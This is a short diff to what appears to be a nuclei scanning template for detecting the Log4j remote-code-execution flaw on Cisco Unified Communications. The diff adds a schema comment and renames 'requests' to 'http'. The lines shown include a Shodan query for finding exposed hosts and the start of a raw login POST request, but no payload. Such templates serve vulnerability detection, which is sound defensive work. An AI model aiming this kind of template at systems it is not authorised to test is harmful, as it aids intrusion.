@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: cisco-unified-communications-log4j
 
 info:
@@ -13,7 +14,7 @@ info:
     shodan-query: title:"Cisco Unified"
   tags: cve,cve2021,rce,jndi,log4j,cisco
 
-requests:
+http:
   - raw:
       - |
         POST /ccmadmin/j_security_check HTTP/1.1
